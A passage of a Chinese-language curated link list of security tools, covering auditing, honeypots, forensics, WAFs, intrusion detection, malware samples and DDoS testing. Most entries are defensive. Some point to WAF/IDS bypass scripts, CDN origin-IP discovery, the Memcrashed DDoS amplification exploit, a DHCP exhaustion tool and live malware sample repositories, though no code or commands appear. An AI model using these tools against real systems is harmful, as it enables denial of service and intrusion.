href="https://github.com/chengr28/Pcap_DNSProxy/blob/master/README.zh-Hans.md">https://github.com/chengr28/Pcap_DNSProxy/blob/master/README.zh-Hans.md</a> Pcap_DNSProxy 是一个基于 WinPcap/LibPcap 用于过滤 DNS 投毒污染的工具</p></li><li><p><a href="https://github.com/PlagueScanner/PlagueScanner">https://github.com/PlagueScanner/PlagueScanner</a> 使用 python 实现的集成 ClamAV、ESET、Bitdefender 的反病毒引擎</p></li><li><p><a href="https://github.com/m4rco-/dorothy2">https://github.com/m4rco-/dorothy2</a> 一款木马、僵尸网络分析框架</p></li><li><p><a href="http://github.com/jumpserver/jumpserver">http://github.com/jumpserver/jumpserver</a> 基于 Python3 的开源堡垒机</p></li><li><p><a href="https://github.com/github/glb-director">https://github.com/github/glb-director</a> 负载均衡组件 GLB，数据解析使用了 dpdk</p></li><li><p><a href="https://github.com/processhacker/processhacker">https://github.com/processhacker/processhacker</a> 监控系统资源、软件调试、检测恶意软件，管理进程</p></li><li><p><a href="https://github.com/TKCERT/mail-security-tester">https://github.com/TKCERT/mail-security-tester</a> 检测邮件防护与过滤系统的测试框架</p></li><li><p><a href="https://github.com/chaitin/sqlchop-http-proxy">https://github.com/chaitin/sqlchop-http-proxy</a> 利用 HTTP 反向代理，内置 SQLChop 作为 SQL 注入攻击检测模块，可以拦截 SQL 注入流量而放行正常流量</p></li><li><p><a href="https://github.com/OWASP/SecureTea-Project">https://github.com/OWASP/SecureTea-Project</a> 当有人私自触碰电脑鼠标或触摸板，进行报警</p></li></ul><h2 id="代码审计应用测试"><a href="#代码审计应用测试" class="headerlink" title="代码审计应用测试#"></a><strong>代码审计应用测试</strong>#</h2><ul><li><p><a href="https://www.waitalone.cn/seay-source-code-auditv2.html">https://www.waitalone.cn/seay-source-code-auditv2.html</a> Seay 源代码审计系统 2.1 版本</p></li><li><p><a href="https://github.com/pyupio/safety">https://github.com/pyupio/safety</a> 检查所有已安装 Python 包, 查找已知的安全漏洞</p></li><li><p><a href="https://github.com/pumasecurity/puma-scan">https://github.com/pumasecurity/puma-scan</a> 实时代码审计，vs 插件</p></li><li><p><a href="https://github.com/wufeifei/cobra">https://github.com/wufeifei/cobra</a> 白盒代码安全审计系统</p></li><li><p><a href="https://github.com/OneSourceCat/phpvulhunter">https://github.com/OneSourceCat/phpvulhunter</a> 静态 php 代码审计</p></li><li><p><a href="https://github.com/ripsscanner/rips">https://github.com/ripsscanner/rips</a> 基于 php 的 php 代码审计工具</p></li><li><p><a href="https://github.com/Qihoo360/phptrace">https://github.com/Qihoo360/phptrace</a> 跟踪、分析 PHP 运行情况的工具</p></li><li><p><a href="https://github.com/ajinabraham/NodeJsScan">https://github.com/ajinabraham/NodeJsScan</a> Node.JS 应用代码审计</p></li><li><p><a href="https://github.com/ctxis/beemka">https://github.com/ctxis/beemka</a> 针对 Electron App 的漏洞利用工具包</p></li><li><p><a href="https://github.com/doyensec/electronegativity">https://github.com/doyensec/electronegativity</a> Electron 应用代码审计，App 的错误配置和安全问题</p></li><li><p><a href="https://github.com/shengqi158/pyvulhunter">https://github.com/shengqi158/pyvulhunter</a> Python 应用审计</p></li><li><p><a href="https://github.com/securego/gosec">https://github.com/securego/gosec</a> Go 语言源码安全分析工具</p></li><li><p><a href="https://github.com/GoSSIP-SJTU/TripleDoggy">https://github.com/GoSSIP-SJTU/TripleDoggy</a> 基于 clang 的 c/c++/object-c 源代码检测框架，有大量接口可以被调用</p></li><li><p><a href="https://github.com/ga0/pyprotect">https://github.com/ga0/pyprotect</a> 给 python 代码加密，防止逆向</p></li><li><p><a href="https://github.com/presidentbeef/brakeman">https://github.com/presidentbeef/brakeman</a> Ruby on Rails 应用静态代码分析</p></li><li><p><a href="https://github.com/python-security/pyt">https://github.com/python-security/pyt</a> 用于检测 Python Web 应用程序中的安全漏洞的静态分析工具</p></li><li><p><a href="https://github.com/m4ll0k/WPSploit">https://github.com/m4ll0k/WPSploit</a> WordPress 插件代码安全审计</p></li><li><p><a href="https://github.com/elcodigok/wphardening">https://github.com/elcodigok/wphardening</a> 加强任何 WordPress 安装的安全</p></li></ul><h2 id="大数据平台安全"><a href="#大数据平台安全" class="headerlink" title="大数据平台安全#"></a><strong>大数据平台安全</strong>#</h2><ul><li><p><a href="https://github.com/shouc/BDA">https://github.com/shouc/BDA</a> 针对 hadoop/spark/mysql 等大数据平台的审计与检测</p></li><li><p><a href="https://github.com/wavestone-cdt/hadoop-attack-library">https://github.com/wavestone-cdt/hadoop-attack-library</a> hadoop 测试方式和工具集</p></li></ul><h2 id="蜜罐安全"><a href="#蜜罐安全" class="headerlink" title="蜜罐安全#"></a><strong>蜜罐安全</strong>#</h2><ul><li><p><a href="https://github.com/paralax/awesome-honeypots">https://github.com/paralax/awesome-honeypots</a> 蜜罐开源技术收集</p></li><li><p><a href="https://github.com/threatstream/mhn">https://github.com/threatstream/mhn</a> 现代蜜网，集成了多种蜜罐的安装脚本，可以快速部署、使用，也能够快速的从节点收集数据</p></li><li><p><a href="https://github.com/dtag-dev-sec/tpotce">https://github.com/dtag-dev-sec/tpotce</a> T-POT，里面使用 docker 技术实现多个蜜罐组合，配合 ELK 进行研究与数据捕获</p></li><li><p><a href="https://www.freebuf.com/sectool/190840.html">https://www.freebuf.com/sectool/190840.html</a> T-Pot 多蜜罐平台使用心法</p></li><li><p><a href="https://github.com/n3uz/t-pot-autoinstall">https://github.com/n3uz/t-pot-autoinstall</a> 将 fork 的 T-POT 蜜罐的一键安装脚本替换为国内加速镜像</p></li></ul><h2 id="Web-蜜罐内网监测"><a href="#Web-蜜罐内网监测" class="headerlink" title="Web 蜜罐内网监测#"></a><strong>Web 蜜罐内网监测</strong>#</h2><ul><li><p><a href="https://github.com/micheloosterhof/cowrie">https://github.com/micheloosterhof/cowrie</a> py2，使用 ELK（ElasticSearch，LogStash，Kibana）进行数据分析，目前支持 ssh，telnet，sftp 等协议</p></li><li><p><a href="https://github.com/mushorg/snare">https://github.com/mushorg/snare</a> py3，web 安全蜜罐，可克隆指定 Web 页面</p></li><li><p><a href="https://github.com/honeynet/beeswarm">https://github.com/honeynet/beeswarm</a> py，使用 agent 探针与蜜罐进行实时交互来引诱攻击者</p></li><li><p><a href="https://github.com/thinkst/opencanary">https://github.com/thinkst/opencanary</a> PY2,SNMP\RDP\SAMBA 蜜罐</p></li><li><p><a href="https://github.com/p1r06u3/opencanary_web">https://github.com/p1r06u3/opencanary_web</a> PY,TORNADO,内网低交互蜜罐。支持自动化安装，目前支持常见的 16 中协议，现为探针/蜜罐-管理的架构，可以考虑二次开发为探针-沙盒-管理的架构</p></li><li><p><a href="https://github.com/p1r06u3/opencanary_web">https://github.com/p1r06u3/opencanary_web</a></p></li><li><p><a href="https://github.com/Cymmetria">https://github.com/Cymmetria</a> 知名欺骗防御蜜罐组织。Struct、weblogic、telnet、Cisco ASA、Micros 等仿真蜜罐</p></li><li><p><a href="https://github.com/Cymmetria/honeycomb">https://github.com/Cymmetria/honeycomb</a> Cymmetria 公司开源蜜罐框架，低交互</p></li><li><p><a href="https://github.com/honeytrap/honeytrap">https://github.com/honeytrap/honeytrap</a> 可扩展蜜罐框架，支持探针部署与高交互蜜罐</p></li><li><p><a href="https://gosecure.net/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/">https://gosecure.net/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/</a> RDP MITM，打造可记录图像和按键的 RDP 蜜罐（<a href="https://github.com/gosecure/pyrdp%EF%BC%89">https://github.com/gosecure/pyrdp）</a></p></li></ul><h2 id="摄像头蜜罐"><a href="#摄像头蜜罐" class="headerlink" title="摄像头蜜罐#"></a><strong>摄像头蜜罐</strong>#</h2><ul><li><p><a href="https://github.com/alexbredo/honeypot-camera">https://github.com/alexbredo/honeypot-camera</a> py，摄像头蜜罐。tornado 模拟 WEB 服务，图片代替视频，可以考虑后期多加点图片和按钮</p></li><li><p><a href="https://github.com/EasyDarwin/EasyIPCamera">https://github.com/EasyDarwin/EasyIPCamera</a> C，RTSP 服务器组件用以构建摄像头蜜罐</p></li></ul><h2 id="工控蜜罐"><a href="#工控蜜罐" class="headerlink" title="工控蜜罐#"></a><strong>工控蜜罐</strong>#</h2><ul><li><p><a href="https://github.com/sjhilt/GasPot">https://github.com/sjhilt/GasPot</a> 模拟油电燃气工控系统</p></li><li><p><a href="https://github.com/djformby/GRFICS">https://github.com/djformby/GRFICS</a> IoT 工业仿真系统模拟框架，采用 MODBUS 协议对 PLC 虚拟机监视和控制</p></li><li><p><a href="https://github.com/RabitW/IoTSecurityNAT">https://github.com/RabitW/IoTSecurityNAT</a> IoT 测试系统，方便快速接入各种设备，进行安全测试</p></li><li><p><a href="https://github.com/mushorg/conpot">https://github.com/mushorg/conpot</a> 针对 ICS/SCADA 的低交互工控蜜罐，模拟 Modbus 和 S7comm</p></li></ul><h2 id="逆向相关"><a href="#逆向相关" class="headerlink" title="逆向相关#"></a><strong>逆向相关</strong>#</h2><ul><li><p><a href="https://www.peerlyst.com/posts/resource-learning-how-to-reverse-malware-a-guide">https://www.peerlyst.com/posts/resource-learning-how-to-reverse-malware-a-guide</a> 恶意软件逆向指南和工具的集合</p></li><li><p><a href="https://github.com/ReFirmLabs/binwalk">https://github.com/ReFirmLabs/binwalk</a> 二进制 pwn 文件自动化逆向，拥有多种插件</p></li><li><p><a href="https://github.com/angr/angr">https://github.com/angr/angr</a> 一个具有动态符号执行和静态分析的二进制分析工具</p></li><li><p><a href="https://github.com/endgameinc/xori">https://github.com/endgameinc/xori</a> 自定义反汇编框架</p></li><li><p><a href="https://down.52pojie.cn/">https://down.52pojie.cn/</a> 吾爱破解爱盘工具包</p></li><li><p><a href="https://github.com/blacknbunny/peanalyzer32">https://github.com/blacknbunny/peanalyzer32</a> PE 文件分析和反汇编工具</p></li><li><p><a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a> 不用 root 权限就可以监控进程运行</p></li></ul><h2 id="CTF-相关"><a href="#CTF-相关" class="headerlink" title="CTF 相关#"></a><strong>CTF 相关</strong>#</h2><ul><li><p><a href="https://ctf-wiki.github.io/ctf-wiki/">https://ctf-wiki.github.io/ctf-wiki/</a> CTFwiki，Misc/Crypto/Web/Assembly/Executable/Reverse/Pwn/Android/ICS</p></li><li><p><a href="https://github.com/adon90/pentest_compilation">https://github.com/adon90/pentest_compilation</a> ctf 比赛与 OSCP 考试中常见的知识点和命令</p></li><li><p><a href="https://github.com/gabemarshall/microctfs">https://github.com/gabemarshall/microctfs</a> 小型 ctf 镜像 docker</p></li><li><p><a href="https://github.com/giantbranch/pwn_deploy_chroot">https://github.com/giantbranch/pwn_deploy_chroot</a> 部署多个 pwn 题到一个 docker 容器中</p></li><li><p><a href="https://github.com/facebook/fbctf">https://github.com/facebook/fbctf</a> CTF 比赛框架</p></li><li><p><a href="https://github.com/0Chencc/CTFCrackTools">https://github.com/0Chencc/CTFCrackTools</a> CTF 工具集成包</p></li><li><p><a href="https://github.com/guyoung/CaptfEncoder">https://github.com/guyoung/CaptfEncoder</a> CTF 密码编码全家桶，还有小程序版本</p></li><li><p><a href="https://github.com/Gallopsled/pwntools">https://github.com/Gallopsled/pwntools</a> pwn 类型，二进制利用框架</p></li><li><p><a href="https://github.com/ChrisTheCoolHut/Zeratool">https://github.com/ChrisTheCoolHut/Zeratool</a> pwn 类型，二进制利用框架</p></li><li><p><a href="https://github.com/ChrisTheCoolHut/Rocket-Shot">https://github.com/ChrisTheCoolHut/Rocket-Shot</a> pwn，自动攻击脚本</p></li><li><p><a href="https://0xrick.github.io/lists/stego/">https://0xrick.github.io/lists/stego/</a> 隐写术工具集，Steganography - A list of useful tools and resources</p></li><li><p><a href="https://github.com/DominicBreuker/stego-toolkit">https://github.com/DominicBreuker/stego-toolkit</a> 隐写工具包</p></li><li><p><a href="https://github.com/bugsafe/WeReport">https://github.com/bugsafe/WeReport</a> WeReport 报告助手</p></li><li><p><a href="https://github.com/PELock/CrackMeZ3S-CTF-CrackMe-Tutorial">https://github.com/PELock/CrackMeZ3S-CTF-CrackMe-Tutorial</a> 为 CTF 比赛编写 CrackMe 软件</p></li></ul><h2 id="计算机与移动设备取证调查"><a href="#计算机与移动设备取证调查" class="headerlink" title="计算机与移动设备取证调查#"></a><strong>计算机与移动设备取证调查</strong>#</h2><ul><li><p><a href="https://www.freebuf.com/articles/rookie/195107.html">https://www.freebuf.com/articles/rookie/195107.html</a> 记一次微信数据库解密过程。微信的加密数据库的解密密码是由“设备的 IMEI(MEID)+用户的 uin，进行 MD5，然后取其前 7 位小写字母”构成的</p></li><li><p><a href="https://www.audacityteam.org/">https://www.audacityteam.org/</a> 音频文件和波形图处理工具</p></li><li><p><a href="http://www.sweetscape.com/010editor/">http://www.sweetscape.com/010editor/</a> 识别不同文件格式（模板）的 16 进制编辑器，具有文件修复功能</p></li><li><p><a href="http://www.magicexif.com/">http://www.magicexif.com/</a> 将照片图像中的 exif 信息数据化</p></li><li><p><a href="http://mediaarea.net/MediaInfo">http://mediaarea.net/MediaInfo</a> 类似 exiftool 来查看内容区域和元数据信息</p></li><li><p><a href="https://www.sno.phy.queensu.ca/~phil/exiftool/">https://www.sno.phy.queensu.ca/~phil/exiftool/</a> 检查图像文件的 exif 元数据</p></li><li><p><a href="https://www.gimp.org/">https://www.gimp.org/</a> Gimp 提供了转换各类图像文件可视化数据的功能，还可以用于确认文件是否是一个图像文件</p></li><li><p><a href="https://github.com/volatilityfoundation/volatility">https://github.com/volatilityfoundation/volatility</a> windows 内存取证分析</p></li><li><p><a href="https://github.com/gleeda/memtriage">https://github.com/gleeda/memtriage</a> Windows 内存取证分析</p></li><li><p><a href="https://github.com/SekoiaLab/Fastir_Collector">https://github.com/SekoiaLab/Fastir_Collector</a> Windows 取证/信息收集，不限于内存，注册表，文件信息等</p></li><li><p><a href="https://github.com/Viralmaniar/Remote-Desktop-Caching-">https://github.com/Viralmaniar/Remote-Desktop-Caching-</a> RDP 信息复原，png 图片格式</p></li><li><p><a href="https://github.com/comaeio/LiveCloudKd">https://github.com/comaeio/LiveCloudKd</a> C，针对 Hyper-V 的内存取证</p></li><li><p><a href="https://github.com/sevagas/swap_digger">https://github.com/sevagas/swap_digger</a> 针对 Linux swap 进行取证分析的工具</p></li><li><p><a href="http://extundelete.sourceforge.net/">http://extundelete.sourceforge.net/</a> linux 下的文件恢复</p></li><li><p><a href="https://github.com/viaforensics/android-forensics">https://github.com/viaforensics/android-forensics</a> 安卓取证 App 和框架，可以对安卓设备内各种信息进行提取</p></li><li><p><a href="https://github.com/davidmcgrew/joy">https://github.com/davidmcgrew/joy</a> 用来捕获和分析内外网流量数据的包，主要用于进行网络调查、安全监控和取证</p></li><li><p><a href="https://github.com/USArmyResearchLab/Dshell">https://github.com/USArmyResearchLab/Dshell</a> 可扩展的网络取证分析框架，支持快速开发插件与解析网络数据包捕获</p></li><li><p><a href="http://qpdf.sourceforge.net/">http://qpdf.sourceforge.net/</a> 查看 pdf 文件并整理提取信息</p></li><li><p><a href="http://zipinfo.com/">http://zipinfo.com/</a> 在无需提取的情况下列出了 zip 文件的内容信息</p></li><li><p><a href="http://f00l.de/pcapfix/">http://f00l.de/pcapfix/</a> pcap 文件修复</p></li><li><p><a href="https://www.cgsecurity.org/wiki/TestDisk">https://www.cgsecurity.org/wiki/TestDisk</a> 磁盘分区修复</p></li><li><p><a href="https://github.com/decalage2/oletools">https://github.com/decalage2/oletools</a> py，用于分析 MS OLE2 文件（结构化存储，复合文件二进制格式）和 MS Office 文档</p></li><li><p><a href="https://www.xplico.org/download">https://www.xplico.org/download</a> 内存取证</p></li><li><p><a href="https://github.com/google/bochspwn-reloaded">https://github.com/google/bochspwn-reloaded</a> Bochspwn Reloaded（内核信息泄漏检测）工具</p></li><li><p><a href="https://github.com/abrignoni/DFIR-SQL-Query-Repo">https://github.com/abrignoni/DFIR-SQL-Query-Repo</a> 收集用于数据取证的 SQL 查询模板</p></li><li><p><a href="https://www.freebuf.com/news/193684.html">https://www.freebuf.com/news/193684.html</a> iOS 取证技巧：在无损的情况下完整导出 SQLite 数据库</p></li></ul><h2 id="移动安全"><a href="#移动安全" class="headerlink" title="移动安全#"></a><strong>移动安全</strong>#</h2><ul><li><p><a href="https://github.com/Brucetg/App_Security">https://github.com/Brucetg/App_Security</a> App 安全学习资源</p></li><li><p><a href="https://github.com/rovo89/Xposed">https://github.com/rovo89/Xposed</a> 随心所欲修改安卓手机系统</p></li><li><p><a href="https://github.com/android-hacker/VirtualXposed">https://github.com/android-hacker/VirtualXposed</a> 基于 VirtualApp 和 epic 在非 ROOT 环境下运行 Xposed 模块的实现</p></li><li><p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">https://github.com/MobSF/Mobile-Security-Framework-MobSF</a> 移动安全审计框架。android、ios、win</p></li><li><p><a href="https://github.com/WooyunDota/DroidSSLUnpinning">https://github.com/WooyunDota/DroidSSLUnpinning</a> 安卓证书锁定解除的工具</p></li><li><p><a href="https://github.com/nccgroup/house">https://github.com/nccgroup/house</a> 运行时手机 App 分析工具包, 带 Web GUI</p></li><li><p><a href="https://github.com/UltimateHackers/Diggy">https://github.com/UltimateHackers/Diggy</a> 从 Apk 文件中提取 URLs 的工具</p></li><li><p><a href="https://github.com/nettitude/scrounger">https://github.com/nettitude/scrounger</a> iOS 和 Android 移动应用程序渗透测试框架</p></li><li><p><a href="https://github.com/XekriCorp/LeakVM">https://github.com/XekriCorp/LeakVM</a> 安卓应用安全测试框架</p></li><li><p><a href="https://github.com/zsdlove/ApkVulCheck">https://github.com/zsdlove/ApkVulCheck</a> 安卓漏洞扫描工具</p></li><li><p><a href="https://github.com/samyk/frisky">https://github.com/samyk/frisky</a> 针对 ios/macOS 应用的嗅探/修改/逆向/注入等工具</p></li><li><p><a href="https://github.com/GeoSn0w/OsirisJailbreak12">https://github.com/GeoSn0w/OsirisJailbreak12</a> IOS12 不完全越狱</p></li><li><p><a href="https://github.com/chaitin/passionfruit">https://github.com/chaitin/passionfruit</a> iOS 应用逆向与分析工具，可以大大加速 iOS 应用安全分析过程</p></li></ul><h2 id="防火墙规则、Waf、CDN-相关"><a href="#防火墙规则、Waf、CDN-相关" class="headerlink" title="防火墙规则、Waf、CDN 相关#"></a><strong>防火墙规则、Waf、CDN 相关</strong>#</h2><ul><li><p><a href="https://github.com/baidu/openrasp">https://github.com/baidu/openrasp</a> RASP,Runtime Application Self-Protection，实时应用自我保护，更智能，针对每个语言定制</p></li><li><p><a href="https://github.com/snort3/snort3">https://github.com/snort3/snort3</a> snort 算是最出名的开源 ids 入侵检测</p></li><li><p><a href="https://github.com/chaitin/yanshi">https://github.com/chaitin/yanshi</a> 长亭偃师（yanshi）,雷池（SafeLine）防火墙核心引擎使用到的代码生成工具</p></li><li><p><a href="https://github.com/SpiderLabs/ModSecurity">https://github.com/SpiderLabs/ModSecurity</a> C，跨平台 WAF engine for Apache, IIS and Nginx</p></li><li><p><a href="https://github.com/klaubert/waf-fle">https://github.com/klaubert/waf-fle</a> ModSecurity Web 控制台</p></li><li><p><a href="https://github.com/xsec-lab/x-waf">https://github.com/xsec-lab/x-waf</a> 适用于中小企业的云 waf</p></li><li><p><a href="https://github.com/jx-sec/jxwaf">https://github.com/jx-sec/jxwaf</a> 基于 openrestynginx+lua 开发，独创的业务逻辑防护引擎和机器学习引擎，解决传统 WAF 无法对业务安全进行防护的痛点</p></li><li><p><a href="https://github.com/loveshell/ngx_lua_waf">https://github.com/loveshell/ngx_lua_waf</a> 基于 lua-nginx-moduleopenresty 的 web 应用防火墙</p></li><li><p><a href="https://github.com/Janusec/janusec">https://github.com/Janusec/janusec</a> 基于 Golang 开发的应用安全网关，具备 WAF、CC 攻击防御、证书私钥加密、负载均衡、统一 Web 化管理等功能。</p></li><li><p><a href="https://github.com/SpiderLabs/owasp-modsecurity-crs">https://github.com/SpiderLabs/owasp-modsecurity-crs</a> a set of generic attack detection rules for use with ModSecurity or compatible web application firewalls</p></li><li><p><a href="https://github.com/kirillwow/ids_bypass">https://github.com/kirillwow/ids_bypass</a> IDS Bypass 脚本</p></li><li><p><a href="https://github.com/milo2012/ipv4bypass">https://github.com/milo2012/ipv4bypass</a> 利用 ipV6 地址绕过 waf</p></li><li><p><a href="https://github.com/3xp10it/bypass_waf">https://github.com/3xp10it/bypass_waf</a> 防火墙绕过脚本</p></li><li><p><a href="https://github.com/m0rtem/CloudFail">https://github.com/m0rtem/CloudFail</a> 针对 Cloudfail,查找位于 CDN 后面网站的真实 IP</p></li><li><p><a href="https://github.com/Nitr4x/whichCDN">https://github.com/Nitr4x/whichCDN</a> CDN 识别、检测</p></li><li><p><a href="https://github.com/3xp10it/xcdn">https://github.com/3xp10it/xcdn</a> 尝试找出 cdn 背后的真实 ip，3xp10it.github.io 博客</p></li></ul><h2 id="入侵检测"><a href="#入侵检测" class="headerlink" title="入侵检测#"></a><strong>入侵检测</strong>#</h2><ul><li><p><a href="https://github.com/Neo23x0/Loki">https://github.com/Neo23x0/Loki</a> 一款 APT 入侵痕迹扫描器</p></li><li><p><a href="https://github.com/ossec/ossec-hids">https://github.com/ossec/ossec-hids</a> 开源 hids 堡垒机</p></li><li><p><a href="https://github.com/grayddq/HIDS">https://github.com/grayddq/HIDS</a> hids 基于主机型入侵检测系统，一个人的安全部</p></li><li><p><a href="https://github.com/ysrc/yulong-hids">https://github.com/ysrc/yulong-hids</a> 驭龙 HIDS 是一款由 YSRC 开源的入侵检测系统</p></li><li><p><a href="https://github.com/DianrongSecurity/AgentSmith-HIDS">https://github.com/DianrongSecurity/AgentSmith-HIDS</a> 点融开源 HIDS，开源部分为主机情报收集工具</p></li><li><p><a href="https://github.com/Tencent/HaboMalHunter">https://github.com/Tencent/HaboMalHunter</a> 哈勃分析系统，linux 系统病毒分析及安全测试</p></li><li><p><a href="https://github.com/JPCERTCC/LogonTracer">https://github.com/JPCERTCC/LogonTracer</a> 根据 win 登陆记录日志来分析并用图形化展示恶意登陆行为</p></li><li><p><a href="https://github.com/anwi-wips/anwi">https://github.com/anwi-wips/anwi</a> 无线 IDS, 基于低成本的 Wi-Fi 模块(ESP8266)</p></li><li><p><a href="https://github.com/Security-Onion-Solutions/security-onion">https://github.com/Security-Onion-Solutions/security-onion</a> 基于 ubuntu 用于入侵检测，网络安全监控和日志管理，采用分布式架构</p></li><li><p><a href="https://github.com/jpcertcc/sysmonsearch">https://github.com/jpcertcc/sysmonsearch</a> 将 Sysmon 的日志结果可视化</p></li><li><p><a href="http://m.imooc.com/article/21236">http://m.imooc.com/article/21236</a> 快速自检电脑是否被黑客入侵过(Windows 版)</p></li><li><p><a href="http://www.freebuf.com/articles/system/157597.html">http://www.freebuf.com/articles/system/157597.html</a> 快速自检电脑是否被黑客入侵过（Linux 版）</p></li><li><p><a href="http://www.freebuf.com/rookie/179638.html">http://www.freebuf.com/rookie/179638.html</a> 服务器入侵溯源小技巧整理</p></li><li><p><a href="https://github.com/zhanghaoyil/Hawk-I">https://github.com/zhanghaoyil/Hawk-I</a> 基于无监督机器学习算法从 Web 日志中自动提取攻击 Payload</p></li></ul><h2 id="恶意文件测与样本分析"><a href="#恶意文件测与样本分析" class="headerlink" title="恶意文件测与样本分析#"></a><strong>恶意文件测与样本分析</strong>#</h2><ul><li><p><a href="https://github.com/open-power-workgroup/Hospital">https://github.com/open-power-workgroup/Hospital</a> 全国莆田系医院名单</p></li><li><p><a href="https://github.com/chenerlich/FCL">https://github.com/chenerlich/FCL</a> 恶意代码使用的命令行收集</p></li><li><p><a href="https://paper.seebug.org/421">https://paper.seebug.org/421</a> 常见软件合集与恶意软件分析</p></li><li><p><a href="https://github.com/sapphirex00/Threat-Hunting">https://github.com/sapphirex00/Threat-Hunting</a> apt 恶意软件样本</p></li><li><p><a href="https://www.malware-traffic-analysis.net/">https://www.malware-traffic-analysis.net/</a> 恶意软件样本</p></li><li><p><a href="http://dasmalwerk.eu/">http://dasmalwerk.eu/</a> 恶意软件样本</p></li><li><p><a href="https://github.com/ytisf/theZoo">https://github.com/ytisf/theZoo</a> 恶意软件样本</p></li><li><p><a href="https://github.com/mstfknn/malware-sample-library">https://github.com/mstfknn/malware-sample-library</a> 恶意软件样本</p></li><li><p><a href="http://99.248.235.4/Library/">http://99.248.235.4/Library/</a> 恶意软件样本库。ladder</p></li><li><p><a href="https://github.com/robbyFux/Ragpicker">https://github.com/robbyFux/Ragpicker</a> 恶意软件信息爬取汇总分析</p></li><li><p><a href="https://github.com/phage-nz/ph0neutria">https://github.com/phage-nz/ph0neutria</a> 恶意软件信息爬取汇总分析</p></li><li><p><a href="https://github.com/JR0driguezB/malware_configs">https://github.com/JR0driguezB/malware_configs</a> 常见恶意配置文件</p></li><li><p><a href="https://github.com/sfaci/masc">https://github.com/sfaci/masc</a> 扫描网站中的恶意软件, 以及其他一些网站维护功能</p></li><li><p><a href="https://github.com/Neo23x0/munin">https://github.com/Neo23x0/munin</a> 依据文件 Hash 从各种在线恶意软件扫描服务提取信息的工具</p></li><li><p><a href="https://github.com/1lastBr3ath/drmine">https://github.com/1lastBr3ath/drmine</a> 自动化检测网页是否包含挖矿脚本的工具</p></li><li><p><a href="https://github.com/KasperskyLab/klara">https://github.com/KasperskyLab/klara</a> 卡巴斯基开源基于 Yara 的分布式恶意软件扫描系统,</p></li><li><p><a href="https://github.com/botherder/kraken">https://github.com/botherder/kraken</a> go，实现的 Yara 恶意软件扫描器</p></li><li><p><a href="https://github.com/alexandreborges/malwoverview">https://github.com/alexandreborges/malwoverview</a> simple，将恶意文件进行快速分类</p></li><li><p><a href="https://github.com/joxeankoret/pigaios">https://github.com/joxeankoret/pigaios</a> 直接对比源代码与编译的二进制文件</p></li><li><p><a href="https://github.com/viper-framework">https://github.com/viper-framework</a> py2，二进制分析和管理框架，对恶意文件进行分析</p></li><li><p><a href="https://github.com/netxfly/sec_check">https://github.com/netxfly/sec_check</a> 通过信息采集（账户、连接、端口等）与 yara 扫描进行安全检测</p></li><li><p><a href="https://github.com/nao-sec/tknk_scanner">https://github.com/nao-sec/tknk_scanner</a> yara 引擎为基础的恶意软件识别框架</p></li><li><p><a href="https://github.com/felixweyne/ProcessSpawnControl">https://github.com/felixweyne/ProcessSpawnControl</a> powershell,对恶意程序进行检测与监控</p></li><li><p><a href="https://github.com/Aurore54F/JaSt">https://github.com/Aurore54F/JaSt</a> 使用语法检测恶意/混淆的 JS 文件，<a href="https://www.blackhoodie.re/assets/archive/JaSt_blackhoodie.pdf">https://www.blackhoodie.re/assets/archive/JaSt_blackhoodie.pdf</a></p></li><li><p><a href="http://edr.sangfor.com.cn/">http://edr.sangfor.com.cn/</a> win，Linux 下恶意软件、webshell 检测查杀工具</p></li><li><p><a href="http://www.clamav.net/downloads">http://www.clamav.net/downloads</a> 病毒查杀软件</p></li><li><p><a href="http://www.chkrootkit.org/">http://www.chkrootkit.org/</a> rootkit 检测工具</p></li><li><p><a href="http://rootkit.nl/projects/rootkit_hunter.html">http://rootkit.nl/projects/rootkit_hunter.html</a> rootkit 检测工具</p></li></ul><h2 id="恶意文件检测之-Webshell-查杀扫描"><a href="#恶意文件检测之-Webshell-查杀扫描" class="headerlink" title="恶意文件检测之 Webshell 查杀扫描#"></a><strong>恶意文件检测之 Webshell 查杀扫描</strong>#</h2><ul><li><p><a href="http://www.safedog.cn/">http://www.safedog.cn/</a> 安全狗 web 防火墙</p></li><li><p><a href="http://d99net.net/">http://d99net.net/</a> win，啊 D 出品 D 盾 _ 防火墙，包含 waf 与 webshel 检测功能</p></li><li><p><a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a> py，webshell 检查工具，可后期添加后门指纹，很强大</p></li><li><p><a href="https://github.com/ym2011/ScanBackdoor">https://github.com/ym2011/ScanBackdoor</a> 一款简洁的 Webshell 扫描工具</p></li><li><p><a href="https://github.com/erevus-cn/scan_webshell">https://github.com/erevus-cn/scan_webshell</a> webshell 扫描工具</p></li><li><p><a href="https://github.com/yassineaddi/BackdoorMan">https://github.com/yassineaddi/BackdoorMan</a> 可对指定目录进行 php webshell 检测</p></li><li><p><a href="https://github.com/nbs-system/php-malware-finder">https://github.com/nbs-system/php-malware-finder</a> 一款高效率 PHP-webshell 扫描工具</p></li><li><p><a href="https://github.com/emposha/PHP-Shell-Detector">https://github.com/emposha/PHP-Shell-Detector</a> 测试效率高达 99%的 webshell 检测工具</p></li><li><p><a href="https://github.com/emposha/Shell-Detector">https://github.com/emposha/Shell-Detector</a> Webshell 扫描工具，支持 php/perl/asp/aspx webshell 扫描</p></li></ul><h2 id="压力测试与-DDOS-相关"><a href="#压力测试与-DDOS-相关" class="headerlink" title="压力测试与 DDOS 相关#"></a><strong>压力测试与 DDOS 相关</strong>#</h2><ul><li><p><a href="https://github.com/ywjt/Dshield">https://github.com/ywjt/Dshield</a> DDOS 防护</p></li><li><p><a href="https://github.com/NewEraCracker/LOIC/">https://github.com/NewEraCracker/LOIC/</a> 一个为 Windows 设计的网络压力测试工具现已支持 Mac OS——译者注</p></li><li><p><a href="https://github.com/649/Memcrashed-DDoS-Exploit">https://github.com/649/Memcrashed-DDoS-Exploit</a> 利用 Memcached 服务器的 DDoS 攻击工具, 向 Memcached 服务器发送伪造的 UDP 数据包使其向攻击目标回复大量数据包</p></li><li><p><a href="https://github.com/jseidl/GoldenEye">https://github.com/jseidl/GoldenEye</a> py，DOS 测试</p></li><li><p><a href="https://github.com/mschwager/dhcpwn">https://github.com/mschwager/dhcpwn</a> DHCP IP 资源耗尽攻击工具</p></li><li><p><a href="https://github.com/Microsoft/Ethr">https://github.com/Microsoft/Ethr</a> GO,跨平台,TCP, UDP, HTTP, HTTPS 压力测试工具</p></li></ul><h2 